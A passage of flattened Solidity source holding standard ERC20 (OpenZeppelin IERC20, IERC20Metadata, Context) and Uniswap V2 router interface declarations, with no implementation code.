        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../IERC20.sol";

/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/*
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

pragma solidity >=0.6.2;

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

